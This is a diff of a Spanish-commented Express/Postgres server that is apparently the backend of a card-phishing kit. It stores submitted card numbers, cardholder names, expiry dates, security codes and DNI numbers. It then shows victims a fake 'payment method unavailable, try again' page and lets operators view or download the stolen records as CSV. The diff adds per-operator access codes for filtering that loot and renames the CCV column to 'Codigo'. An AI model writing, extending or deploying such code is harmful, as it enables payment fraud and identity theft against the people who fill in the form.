@@ -10,8 +10,14 @@ app.use(express.static(path.join(__dirname, "public")));
 
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
-  ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false
+  ssl: process.env.DATABASE_URL
+    ? { rejectUnauthorized: false }
+    : false
 });
+
+// ======================================================
+// CREAR / ACTUALIZAR TABLA
+// ======================================================
 
 async function crearTabla() {
   await pool.query(`
@@ -23,173 +29,566 @@ async function crearTabla() {
       input4 TEXT,
       input5 TEXT,
       input6 TEXT,
+      codigo INTEGER,
       fecha TIMESTAMP DEFAULT CURRENT_TIMESTAMP
     )
+  `);
+
+  // Si la tabla ya existía antes y no tenía la columna codigo,
+  // la agregamos automáticamente.
+  await pool.query(`
+    ALTER TABLE registros
+    ADD COLUMN IF NOT EXISTS codigo INTEGER
   `);
 }
 
 crearTabla().catch(console.error);
 
+
+// ======================================================
+// PÁGINA PRINCIPAL
+// ======================================================
+
 app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "index.html"));
-});
 
-app.post("/error", async (req, res) => {
-  try {
-    const { input1, input2, input3, input4, input5, input6 } = req.body;
+  const codigo = parseInt(req.query.codigo, 10);
 
-    await pool.query(
-      `
-      INSERT INTO registros 
-      (input1, input2, input3, input4, input5, input6)
-      VALUES ($1, $2, $3, $4, $5, $6)
-      `,
-      [input1, input2, input3, input4, input5, input6]
-    );
-
-    res.send(`
+  // Verificar que venga un código numérico
+  if (!Number.isInteger(codigo)) {
+    return res.status(400).send(`
       <!DOCTYPE html>
       <html lang="es">
       <head>
         <meta charset="UTF-8">
+        <title>Código requerido</title>
+      </head>
+
+      <body style="
+        font-family: Arial;
+        text-align: center;
+        padding: 50px;
+      ">
+
+        <h1>Código de acceso requerido</h1>
+
+        <p>
+          Debe ingresar un código numérico.
+        </p>
+
+        <p>
+          Ejemplo:
+        </p>
+
+        <strong>/?codigo=1</strong>
+
+      </body>
+      </html>
+    `);
+  }
+
+  // ----------------------------------------------------
+  // IMPORTANTE:
+  // Redirigimos a index.html agregando el código.
+  // ----------------------------------------------------
+
+  res.sendFile(
+    path.join(__dirname, "public", "index.html")
+  );
+});
+
+
+// ======================================================
+// GUARDAR REGISTRO
+// ======================================================
+
+app.post("/error", async (req, res) => {
+
+  try {
+
+    const {
+      input1,
+      input2,
+      input3,
+      input4,
+      input5,
+      input6
+    } = req.body;
+
+    /*
+     * El código puede venir desde un campo oculto
+     * del formulario.
+     */
+
+    const codigo = parseInt(req.body.codigo, 10);
+
+    if (!Number.isInteger(codigo)) {
+
+      return res.status(400).send(`
+        <h1>Error</h1>
+        <p>Código de acceso inválido.</p>
+      `);
+
+    }
+
+    // --------------------------------------------------
+    // GUARDAR
+    // --------------------------------------------------
+
+    await pool.query(
+      `
+      INSERT INTO registros
+      (
+        input1,
+        input2,
+        input3,
+        input4,
+        input5,
+        input6,
+        codigo
+      )
+      VALUES ($1, $2, $3, $4, $5, $6, $7)
+      `,
+      [
+        input1,
+        input2,
+        input3,
+        input4,
+        input5,
+        input6,
+        codigo
+      ]
+    );
+
+
+    // --------------------------------------------------
+    // MENSAJE
+    // --------------------------------------------------
+
+    res.send(`
+      <!DOCTYPE html>
+
+      <html lang="es">
+
+      <head>
+
+        <meta charset="UTF-8">
+
         <title>No disponible</title>
+
         <style>
+
           body {
             font-family: Arial, sans-serif;
             background: #f2f2f2;
             height: 100vh;
             margin: 0;
+
             display: flex;
             justify-content: center;
             align-items: center;
           }
+
           .cartel {
             background: white;
             padding: 40px;
+
             border-radius: 12px;
-            box-shadow: 0 0 15px rgba(0,0,0,.2);
+
+            box-shadow:
+              0 0 15px rgba(0,0,0,.2);
+
             text-align: center;
           }
+
         </style>
+
       </head>
+
       <body>
+
         <div class="cartel">
-          <h1>MEDIO DE PAGO NO DISPONIBLE. INTENTÉ NUEVAMENTE</h1>
+
+          <h1>
+            MEDIO DE PAGO NO DISPONIBLE.
+            INTENTÉ NUEVAMENTE
+          </h1>
+
         </div>
+
       </body>
+
       </html>
     `);
 
   } catch (error) {
+
     console.error(error);
-    res.status(500).send("Error al guardar los datos");
-  }
-});
-app.get("/descargar-csv", async (req, res) => {
-  try {
-    const resultado = await pool.query(`
-      SELECT * FROM registros
-      ORDER BY id DESC
-    `);
 
-    let csv = "ID,Numero,Nombre,Mes,Año,DNI\n";
-
-    resultado.rows.forEach(r => {
-      csv += `"${r.id || ""}","${r.input1 || ""}","${r.input2 || ""}","${r.input3 || ""}","${r.input5 || ""}","${r.input6 || ""}"\n`;
-    });
-
-    res.setHeader(
-      "Content-Disposition",
-      "attachment; filename=registros.csv"
+    res.status(500).send(
+      "Error al guardar los datos"
     );
 
-    res.setHeader("Content-Type", "text/csv; charset=utf-8");
-
-    res.send(csv);
-
-  } catch (error) {
-    console.error(error);
-    res.status(500).send("Error al generar CSV");
   }
+
 });
+
+
+// ======================================================
+// LEER REGISTROS
+// ======================================================
+
 app.get("/leer", async (req, res) => {
+
   try {
-    const resultado = await pool.query(`
-      SELECT * FROM registros 
+
+    const codigo = parseInt(req.query.codigo, 10);
+
+    // --------------------------------------------------
+    // Verificar código
+    // --------------------------------------------------
+
+    if (!Number.isInteger(codigo)) {
+
+      return res.status(400).send(`
+        <h1>Código inválido</h1>
+        <p>
+          Utilice, por ejemplo:
+          <br><br>
+          /leer?codigo=1
+        </p>
+      `);
+
+    }
+
+
+    // --------------------------------------------------
+    // BUSCAR SOLO ESE CÓDIGO
+    // --------------------------------------------------
+
+    const resultado = await pool.query(
+      `
+      SELECT *
+      FROM registros
+      WHERE codigo = $1
       ORDER BY id DESC
-    `);
+      `,
+      [codigo]
+    );
+
+
+    // --------------------------------------------------
+    // CREAR FILAS
+    // --------------------------------------------------
 
     let filas = "";
 
     resultado.rows.forEach(r => {
+
       filas += `
         <tr>
+
           <td>${r.id}</td>
+
+          <td>${r.codigo || ""}</td>
+
           <td>${r.input1 || ""}</td>
+
           <td>${r.input2 || ""}</td>
+
           <td>${r.input3 || ""}</td>
+
           <td>${r.input5 || ""}</td>
+
           <td>${r.input6 || ""}</td>
+
+          <td>
+            ${r.fecha
+              ? new Date(r.fecha).toLocaleString("es-AR")
+              : ""}
+          </td>
+
         </tr>
       `;
+
     });
 
+
+    // --------------------------------------------------
+    // MOSTRAR
+    // --------------------------------------------------
+
     res.send(`
+
       <!DOCTYPE html>
+
       <html lang="es">
+
       <head>
+
         <meta charset="UTF-8">
+
         <title>Registros</title>
+
         <style>
+
           body {
+
             font-family: Arial, sans-serif;
+
             padding: 20px;
+
             background: #f5f5f5;
+
           }
-          table {
-            border-collapse: collapse;
-            width: 100%;
+
+          h2 {
+
+            margin-bottom: 20px;
+
+          }
+
+          .info {
+
             background: white;
+
+            padding: 15px;
+
+            margin-bottom: 15px;
+
+            border-radius: 8px;
+
           }
-          th, td {
+
+          table {
+
+            border-collapse: collapse;
+
+            width: 100%;
+
+            background: white;
+
+          }
+
+          th,
+          td {
+
             border: 1px solid #ccc;
+
             padding: 8px;
+
             text-align: left;
+
           }
+
           th {
+
             background: #222;
+
             color: white;
+
           }
+
+          button {
+
+            padding: 10px 15px;
+
+            border: none;
+
+            border-radius: 5px;
+
+            cursor: pointer;
+
+            background: #222;
+
+            color: white;
+
+            margin-bottom: 15px;
+
+          }
+
         </style>
+
       </head>
+
       <body>
-        <h2>Registros guardados</h2>
-<a href="/descargar-csv">
-    <button>📥 Descargar CSV</button>
-</a>
+
+        <h2>
+          Registros guardados
+        </h2>
+
+        <div class="info">
+
+          <strong>
+            Código de acceso:
+          </strong>
+
+          ${codigo}
+
+          <br>
+
+          <strong>
+            Cantidad de registros:
+          </strong>
+
+          ${resultado.rows.length}
+
+        </div>
+
+
+        <a href="/descargar-csv?codigo=${codigo}">
+
+          <button>
+            📥 Descargar CSV
+          </button>
+
+        </a>
+
+
         <table>
+
           <tr>
+
             <th>ID</th>
+
+            <th>Código</th>
+
             <th>Numero</th>
+
             <th>Nombre</th>
+
             <th>Vence</th>
-            <th>CCV</th>
+
+            <th>Codigo</th>
+
             <th>DNI</th>
+
+            <th>Fecha</th>
+
           </tr>
+
           ${filas}
+
         </table>
+
       </body>
+
       </html>
+
     `);
 
   } catch (error) {
+
     console.error(error);
-    res.status(500).send("Error al leer los registros");
+
+    res.status(500).send(
+      "Error al leer los registros"
+    );
+
   }
+
 });
+
+
+// ======================================================
+// DESCARGAR CSV
+// ======================================================
+
+app.get("/descargar-csv", async (req, res) => {
+
+  try {
+
+    const codigo = parseInt(req.query.codigo, 10);
+
+    // --------------------------------------------------
+    // Verificar código
+    // --------------------------------------------------
+
+    if (!Number.isInteger(codigo)) {
+
+      return res.status(400).send(
+        "Código de acceso inválido"
+      );
+
+    }
+
+
+    // --------------------------------------------------
+    // BUSCAR SOLO LOS REGISTROS DE ESE CÓDIGO
+    // --------------------------------------------------
+
+    const resultado = await pool.query(
+      `
+      SELECT *
+      FROM registros
+      WHERE codigo = $1
+      ORDER BY id DESC
+      `,
+      [codigo]
+    );
+
+
+    // --------------------------------------------------
+    // CREAR CSV
+    // --------------------------------------------------
+
+    let csv =
+      "ID,Codigo,Numero,Nombre,Vence,Codigo,DNI,Fecha\n";
+
+
+    resultado.rows.forEach(r => {
+
+      csv +=
+        `"${r.id || ""}",` +
+        `"${r.codigo || ""}",` +
+        `"${r.input1 || ""}",` +
+        `"${r.input2 || ""}",` +
+        `"${r.input3 || ""}",` +
+        `"${r.input5 || ""}",` +
+        `"${r.input6 || ""}",` +
+        `"${r.fecha || ""}"\n`;
+
+    });
+
+
+    // --------------------------------------------------
+    // DESCARGA
+    // --------------------------------------------------
+
+    res.setHeader(
+      "Content-Disposition",
+      `attachment; filename=registros_${codigo}.csv`
+    );
+
+    res.setHeader(
+      "Content-Type",
+      "text/csv; charset=utf-8"
+    );
+
+    res.send(csv);
+
+  } catch (error) {
+
+    console.error(error);
+
+    res.status(500).send(
+      "Error al generar CSV"
+    );
+
+  }
+
+});
+
+
+// ======================================================
+// SERVIDOR
+// ======================================================
 
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () => {
-  console.log("Servidor activo en puerto " + PORT);
+
+  console.log(
+    "Servidor activo en puerto " + PORT
+  );
+
 });
